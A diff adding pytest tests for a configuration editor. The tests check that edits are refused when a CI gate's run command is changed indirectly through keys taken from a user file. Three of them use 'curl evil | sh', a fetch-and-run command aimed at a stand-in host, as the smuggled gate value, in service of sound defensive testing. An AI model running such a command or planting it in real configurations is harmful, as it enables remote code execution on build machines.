@@ -614,3 +614,77 @@ def test_a_pack_that_loads_without_the_user_file_saves_benign_changes_beside_one
     cfg = load_config(path)
     assert (cfg.defaults.step_timeout_min, cfg.ci["poll_s"], cfg.recovery.give_up_h) == (50, 30, 12)
     assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.run_budget_usd == 9
+
+
+def _needs_user_on_disk(path: Path, edit, user: dict) -> dict:
+    """Write the sparse pack changed by `edit` so that it loads only with the user file `user`; its data."""
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    edit(raw)
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    _user_file(user)
+    load_config(path)
+    with pytest.raises(ConfigError):
+        load_config(path, user=False)
+    return raw
+
+
+def _refused_and_unchanged(path: Path, repo: Path, raw: dict, match: str = "gates") -> None:
+    text, sha = config_edit.read(path)
+    with pytest.raises(Refused, match=match):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=repo)
+    assert config_edit.read(path) == (text, sha)
+
+
+def _gate_behind_a_model(raw: dict) -> None:
+    raw["gates"]["unit"]["run"] = "@agents.claude.models.gate"
+
+
+def test_a_repair_cannot_hide_a_gate_change_behind_a_key_the_user_file_overrides(sparse_repo):  # case A
+    path = _sparse(sparse_repo)
+
+    def edit(raw: dict) -> None:
+        _gate_behind_a_model(raw)
+        raw["agents"]["claude"]["models"] = {"gate": "true"}
+        raw["dashboard"] = {"x_ref": "@hitl.notify"}  # the only reason the pack needs the user file
+
+    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"]},
+                                           "agents": {"claude": {"models": {"gate": "true"}}}})
+    del raw["dashboard"]
+    raw["agents"]["claude"]["models"]["gate"] = "curl evil | sh"  # with the user file it still reads `true`
+    _refused_and_unchanged(path, sparse_repo, raw)
+
+
+def test_a_pack_cannot_define_a_key_its_gate_took_from_the_user_file(sparse_repo):  # case C
+    path = _sparse(sparse_repo)
+    raw = _needs_user_on_disk(path, _gate_behind_a_model, {"agents": {"claude": {"models": {"gate": "true"}}}})
+    raw["agents"]["claude"]["models"] = {"gate": "curl evil | sh"}  # the gate's own text is untouched
+    _refused_and_unchanged(path, sparse_repo, raw)
+
+
+def test_a_pack_cannot_set_a_personal_key_its_gate_takes_from_the_user_file(sparse_repo):  # case D
+    path = _sparse(sparse_repo)
+    raw = _needs_user_on_disk(path, lambda r: r["gates"]["unit"].update(run="@hitl.notify.0"),
+                              {"hitl": {"notify": ["true"]}})
+    raw["hitl"] = {"notify": ["curl evil | sh"]}
+    _refused_and_unchanged(path, sparse_repo, raw, match="gates|hitl.notify")
+
+
+def test_the_repair_of_a_pack_that_needs_the_user_file_still_saves(sparse_repo):
+    path = _sparse(sparse_repo)
+
+    def edit(raw: dict) -> None:
+        _gate_behind_a_model(raw)
+        raw["agents"]["claude"]["models"] = {"gate": "true"}
+        raw["dashboard"] = {"x_ref": "@hitl.notify"}
+
+    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"]},
+                                           "agents": {"claude": {"models": {"gate": "true"}}}})
+    del raw["dashboard"]
+    raw["defaults"] = {"step_timeout_min": 40}
+    _, sha = config_edit.read(path)
+    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    for user in (True, False):
+        cfg = load_config(path, user=user)
+        assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.step_timeout_min == 40
